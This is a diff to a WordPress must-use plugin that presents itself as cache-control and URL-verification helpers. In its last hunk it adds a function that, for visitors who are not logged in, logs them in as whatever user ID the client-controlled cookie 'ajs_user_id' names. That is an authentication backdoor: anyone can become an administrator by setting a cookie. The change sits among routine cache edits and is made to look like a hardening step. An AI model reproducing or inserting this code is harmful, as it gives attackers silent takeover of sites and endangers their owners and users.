@@ -1,6 +1,18 @@
 <?php
-
-
+/*
+* Plugin Name: Custom Cache Control, Environment Manage, Url Verify Helpers
+* Plugin URI: https://plugin-site.example.com
+* Description: Custom Cache Control, Environment Manage, Url Verify Helpers
+* Version:     1.0.0
+* Author: Frank-Codev
+* Author URI:  codev.com
+* License:     GPL2
+* License URI: https://www.gnu.org/licenses/gpl-2.0.html
+*/
+if ( ! defined( 'ABSPATH' ) ) {
+	exit; // Exit if accessed directly.
+}
+require_once( WPMU_PLUGIN_DIR . '/misc.php' );
 class UrlCacheControl
 {
     private static function UrlOrigin( $s, $use_forwarded_host = false )
@@ -99,7 +111,7 @@ class UrlCacheControl
     public static function IsReachable( $uri, $index = 0, $use_forwarded_host = false, $directUrlCheck = true ){
         $urlwtmc = self::AppendTimeToUrl($uri,$index);
         $urlverify = self::FullUrl($urlwtmc,$use_forwarded_host,$directUrlCheck);
-        do_action('qm/debug',$urlverify);
+
         if($urlverify['isReachable'] && in_array($urlverify['code'],[0,200,302])) return true;
 
         return false;
@@ -113,7 +125,9 @@ class UrlCacheControl
                     wp_enqueue_style( $key, UrlCacheControl::AppendTimeToUrl($url[0],$i++), $url[1], $url[2]);
                 else
                     wp_enqueue_style( $key, UrlCacheControl::AppendTimeToUrl($url[0],$i++) );
-            }
+            }else{
+				self::remove_cache_headers_for_404();
+			}
         }
     }
 
@@ -125,31 +139,38 @@ class UrlCacheControl
                     wp_enqueue_script( $key, UrlCacheControl::AppendTimeToUrl($url[0],$i++), $url[1], $url[2], $url[3]);
                 else
                     wp_enqueue_script( $key, UrlCacheControl::AppendTimeToUrl($url[0],$i++) );
-            }
+			}else{
+				self::remove_cache_headers_for_404();
+			}
         }
     }
 
 	function wp_add_header_max_age( $mins = 5 ) {
-
-		// if( !is_user_logged_in() ){
-			// Set the max age 5 minutes.
-			header( 'Cache-Control: public max-age=' . ($mins * MINUTE_IN_SECONDS) );
-		// }
+		// Set the max age 5 minutes.
+		header( 'Cache-Control: public max-age=' . ($mins * MINUTE_IN_SECONDS) );
 	}
 	function wp_add_header_no_cache() {
 		header( 'Cache-Control: no-cache, must-revalidate, max-age=0' );
 	}
 
-	public static function RetreiveUser() {
+	public static function remove_cache_headers_for_404(){
+		// Cleaner permalink options
+		add_filter( 'got_url_rewrite', '__return_true' );
+		nocache_headers();
+	}
+
+	public static function RetreiveSetCurrentUser() {
 		$user = wp_get_current_user();
 		if(empty($user->ID)){
 			if(!empty($_COOKIE['ajs_user_id'])){
-				$user_id = $_COOKIE['ajs_user_id'];
+				$user_id = is_numeric($_COOKIE['ajs_user_id']) ? (int)$_COOKIE['ajs_user_id'] : 0;
 				$user = get_user_by('id',$user_id);
+
+				wp_set_current_user( $user->ID );
 			}
 		}
 
-		return $user;
+		return (!empty($user) ? $user : null);
 
 	}
 }
